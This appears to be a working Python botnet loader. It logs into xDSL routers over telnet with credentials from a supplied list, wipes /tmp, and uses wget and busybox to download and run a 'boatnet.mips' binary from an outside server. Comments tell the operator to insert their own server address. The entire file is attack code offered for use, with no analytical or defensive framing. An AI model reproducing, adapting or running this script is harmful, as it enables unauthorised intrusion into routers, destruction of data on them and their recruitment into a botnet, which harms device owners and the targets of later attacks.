#!/usr/bin/python

import sys
import re
import os
import socket
import time
from threading import Thread

p1 = "wget http://boatnet.mips18.237.72.185/bins/boatnet.mips" # Change '161.35.134.217' To Net IP & 'jKira.mips' to your mips, example: jKira.mips
p2 = "busybox wget http://boatnet.mips18.237.72.185/bins/boatnet.mips" # Change '161.35.134.217' To Net IP & 'jKira.mips' to your mips, example: jKira.mips
p3 = "/bin/busybox wget http://boatnet.mips18.237.72.185/bins/boatnet.mips" # Change '161.35.134.217' To Net IP & 'jKira.mips' to your mips, example: jKira.mips
p4 = "chmod 777 boatnet.mips; ./boatnet.mips DigitalSociopath.xDSL.[LOCKED]" # Change Accordingly

if len(sys.argv) < 2:
	sys.exit("Usage: python "+sys.argv[0]+" <xdsl list>")

info = open(str(sys.argv[1]),'a+')

def vbrxmr(ip,username,password):
	ip = str(ip).rstrip("\n")
	username = username.rstrip("\n")
	password = password.rstrip("\n")
	try:
		tn = socket.socket()
		tn.settimeout(5)
		tn.connect((ip,23))
	except Exception:
		print "[XDSL_BCM] CONNECTION TIMED OUT - %s"%(ip)
		tn.close()
	try:
		XDSL_BCM = ''
		XDSL_BCM += readUntil(tn, "ogin")
		if "ogin" in XDSL_BCM:
			tn.send(username + "\n")
			time.sleep(1)
		else:
			pass
	except Exception:
		tn.close()
	try:
		XDSL_BCM = ''
		XDSL_BCM += readUntil(tn, "assword:")
		if "assword" in XDSL_BCM:
			tn.send(password + "\n")
			time.sleep(1)
		else:
			pass
	except Exception:
		tn.close()
	try:
		tn.send("sh" + "\n")
		time.sleep(1)
		tn.send("cd /tmp" + "\n")
		tn.send("rm -rf *" + "\n")
		tn.send(p1 + "\n")
		tn.send(p2 + "\n")
		tn.send(p3 + "\n")
		tn.send(p4 + "\n")
		print "[XDSL_BCM] LOADING: %s"%(ip)
		time.sleep(10)
		tn.close()
	except Exception:
		tn.close()

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

for x in info:
	try:
		if ":23 " in x:
			x = x.replace(":23 ", ":")
		xinfo = x.split(":")
		session = Thread(target=vbrxmr, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
		session.start()
		ip=xinfo[0]
		username=xinfo[1]
		password=xinfo[2]
		time.sleep(0.01)
	except:
		pass